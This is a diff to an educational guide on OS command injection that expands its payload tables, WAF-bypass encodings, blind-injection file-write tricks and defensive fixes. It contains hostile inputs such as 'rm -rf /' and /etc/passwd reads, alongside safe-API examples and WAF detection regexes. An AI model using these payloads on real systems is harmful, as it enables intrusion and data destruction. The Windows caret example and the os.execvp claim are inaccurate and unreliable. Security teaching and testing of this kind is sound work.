@@ -61,7 +61,7 @@ Shells use specific terminal control operators to manage execution flow. Attacke
 | `%0a` / `\n` | Linux & Windows | **Newline Character**: Forces the shell interpreter to view the next set of characters as a brand new command line. | `ping 127.0.0.1%0awhoami` |
 | `&` | Linux & Windows | **Background / Concurrent Processing**: Spawns Command A in the background and immediately runs Command B concurrently. | `ping 127.0.0.1 & whoami` |
 | `&&` | Linux & Windows | **Logical AND**: Executes Command B **only if** Command A terminates successfully (returns an exit code of `0`). | `cd /var/www && cat config.php` |
-| `\|\|` | Linux & Windows | **Logical OR**: Executes Command B **only if** Command A fails or returns an error (returns a non-zero exit code). | `grep 'false' file \|\| whoami` |
+| `||` | Linux & Windows | **Logical OR**: Executes Command B **only if** Command A fails or returns an error (returns a non-zero exit code). | `grep 'false' file || whoami` |
 | `` ` `` | Linux / Unix | **Backtick Substitution**: Evaluates the nested command first, then inserts its string output into the main command. | `echo \`whoami\`` |
 | `$()` | Linux / Unix | **Standard Substitution**: Modern, nestable alternative to backticks. Executes the inner command first. | `echo $(id)` |
 | `\|` | Linux & Windows | **Piping**: Establishes an inter-process communication channel. Redirects `stdout` of Command A into `stdin` of Command B. | `cat /etc/passwd \| grep root` |
@@ -163,8 +163,11 @@ If the vulnerability is Blind (no output on screen) but you have write permissio
 
 # Injects a command to extract user accounts and saves it to the public web root
 product_id=101; id > /var/www/html/images/poc.txt
+
+# Append to existing file (doesn't overwrite)
+product_id=101; whoami >> /var/www/html/images/poc.txt
 ```
-* **Retrieval Step**: Open your browser and navigate directly to `http://vulnerable-target.com` to view the output of the `id` command.
+* **Retrieval Step**: Open your browser and navigate directly to `http://vulnerable-target.com/images/poc.txt` to view the output of the `id` command.
 
 ##### 📝 Real-World Windows Extraction Example
 
@@ -174,9 +177,40 @@ product_id=101; id > /var/www/html/images/poc.txt
 product_id=101 & systeminfo > C:\inetpub\wwwroot\assets\poc.txt
 ```
 
-* **Retrieval Step**: Open your browser and navigate directly to `http://vulnerable-target.com`.
+* **Retrieval Step**: Open your browser and navigate directly to `http://vulnerable-target.com/assets/poc.txt`.
 
-  ## 🚀 5. Advanced Exploitation: Bypasses & Edge Cases
+---
+
+## 🎯 4. Real-World Attack Vectors & Common Entry Points
+
+Understanding where command injection typically occurs in real applications helps prioritize testing.
+
+### Common Entry Points Table
+
+| Entry Point | Description | Example Parameter |
+|-------------|-------------|-------------------|
+| File Upload Names | Upload filename processed by shell | `filename="report.pdf; whoami"` |
+| File Path Parameters | Path used in system commands | `path=/var/log; cat /etc/passwd` |
+| Network Host/IP | Host parameter in network tools | `host=127.0.0.1; whoami` |
+| DNS Lookup | Domain passed to `nslookup`/`dig` | `domain=com; whoami` |
+| Ping Utility | IP in ping command | `ip=127.0.0.1; whoami` |
+| Archive Extraction | Filename in `tar`/`zip` | `file=archive.zip; rm -rf /` |
+| Database Export | Query result passed to shell | `query=SELECT *; whoami` |
+| System Report | Parameter in reporting tool | `report=system; cat /etc/passwd` |
+
+### Dangerous Library Functions by Language
+
+| Language | Dangerous Functions | Safe Alternatives |
+|----------|-------------------|-------------------|
+| Python | `os.system()`, `os.popen()`, `subprocess.call(shell=True)` | `subprocess.run(list, shell=False)` |
+| PHP | `exec()`, `shell_exec()`, `passthru()`, `system()` | `escapeshellarg()`, native libs |
+| Node.js | `child_process.exec()`, `execSync()` | `child_process.spawn()` |
+| Java | `Runtime.exec()`, `ProcessBuilder` (with string) | `ProcessBuilder` (with list) |
+| Ruby | `exec()`, `system()`, `eval()` | `spawn()` with array |
+
+---
+
+## 🚀 5. Advanced Exploitation: Bypasses & Edge Cases
 
 When testing real-world applications, simple character separators like `;` or spaces are often blocked by Web Application Firewalls (WAFs) or input filters. You must use specialized encoding and structural bypasses.
 
@@ -188,6 +222,17 @@ If the application strips or blocks spaces (` `), you cannot separate your comma
   ```bash
   cat$IFS/etc/passwd
   ```
+
+#### Windows Space Alternatives
+* **Caret (`^`)**: Escape character in Windows cmd
+  ```cmd
+  cat^ /etc/passwd
+  ```
+* **URL-encoded space**: `%20` or `+`
+  ```bash
+  cat%20/etc/passwd
+  ```
+
 ### B. URL and Hex Encoding Bypasses
 Many web applications use input filters or Web Application Firewalls (WAFs) that inspect raw text for dangerous characters like `;`, `&`, `|`, or spaces. If the filter checks the payload *before* the application fully URL-decodes the user input, you can bypass the signature check completely. 
 
@@ -203,6 +248,8 @@ Replace blocked command separators with their equivalent hexadecimal ASCII value
 | `\|` | `%7C` | Pipe Operator (Windows/Linux) |
 | ` ` (Space) | `%20` or `+` | Argument Separation |
 | `\n` (Newline) | `%0A` | Command Line Break (Bypasses many front-end filters) |
+
+**Note**: `%0a` = URL-encoded newline (works in HTTP requests), `\n` = Literal newline character (works in shell input)
 
 #### 📝 Real-World URL Encoding Example
 If an application blocks raw semicolons, an input like `product_id=101;whoami` will trigger a security exception. By encoding the semicolon to `%3B` and spaces to `%20`, the string bypasses raw validation rules.
@@ -237,7 +284,18 @@ Content-Length: 43
 product_id=101%2526%2520sleep%252010
 ```
 
+---
 
+### C. Argument Injection (CWE-88) Variant
+Sometimes shell separators are blocked completely, but you can inject flags into a safe API call.
+
+```bash
+# Target: safe_command --file=user_input
+# Injection: user_input = "/etc/passwd --verbose --output=/tmp/leaked"
+# Result: safe_command --file=/etc/passwd --verbose --output=/tmp/leaked
+```
+
+---
 
 ## 🛡️ 6. Advanced Defensive Engineering & Remediation
 
@@ -256,6 +314,22 @@ def compress_log(user_filename):
     
     # Kernel executes: tar -czf compressed.tar.gz /var/logs/file.log; rm -rf /
     os.system(command) 
+```
+
+### ⚠️ Critical: NEVER Use shell=True with User Input
+```python
+# DANGEROUS EVEN WITH subprocess
+subprocess.run(command, shell=True)  # ❌ Vulnerable!
+
+# The shell=True re-invokes /bin/sh, allowing injection
+```
+
+### ALL OF THESE ARE VULNERABLE:
+```python
+os.system(command)      # ❌ Vulnerable
+os.popen(command)       # ❌ Vulnerable  
+os.execvp(command)      # ❌ Vulnerable if string passed
+subprocess.call(command, shell=True)  # ❌ Vulnerable
 ```
 
 ### ✅ The Definitively Secure Fix: Avoid System Shells entirely
@@ -284,8 +358,8 @@ import re
 
 def validate_input(user_input):
     # Only allow characters, numbers, and no special punctuation or shell tokens
-    # Rejects semicolons, ampersands, backticks, or pipes completely
-    if re.match("^[a-zA-Z0-9_\-\.]+$", user_input):
+    # Rejects semicolons, ampersands, backticks, pipes, AND path traversal
+    if re.match("^[a-zA-Z0-9_]+$", user_input) and '..' not in user_input:
         return True
     else:
         raise ValueError("Malicious input token detected. Transaction aborted.")
@@ -293,3 +367,59 @@ def validate_input(user_input):
 
 ---
 
+### Additional Language-Specific Safe Examples
+
+#### PHP Safe Example
+```php
+// VULNERABLE
+exec("cat " . $filename);  // ❌
+
+// SAFE
+exec("cat " . escapeshellarg($filename));  // ✅
+```
+
+#### Node.js Safe Example
+```javascript
+// VULNERABLE
+child_process.exec(`cat ${filename}`);  // ❌
+
+// SAFE
+child_process.spawn('cat', [filename]);  // ✅
+```
+
+#### Java Safe Example
+```java
+// VULNERABLE
+Runtime.getRuntime().exec("cat " + filename);  // ❌
+
+// SAFE
+ProcessBuilder pb = new ProcessBuilder("cat", filename);  // ✅
+```
+
+---
+
+### Web Application Firewall (WAF) Detection Rules
+```regex
+# Block common command separators
+(;|\||&|\$|\`|\\n|<|>)
+
+# Block common injection patterns
+(;.*(?:whoami|id|cat|pwd|uname))
+(\$\{.*\})
+(\`.*\`)
+```
+
+---
+
+### Command Injection Testing Checklist
+-  Test all input fields (URL params, POST body, headers, cookies)
+-  Test file upload names and paths
+-  Test API parameters (JSON, XML)
+-  Test database query results passed to shell
+-  Test error messages (may leak shell output)
+-  Test both Linux AND Windows syntax
+-  Test URL-encoded variations
+-  Test time-based payloads for blind injection
+-  Test OAST (DNS/HTTP) for async execution
+
+---
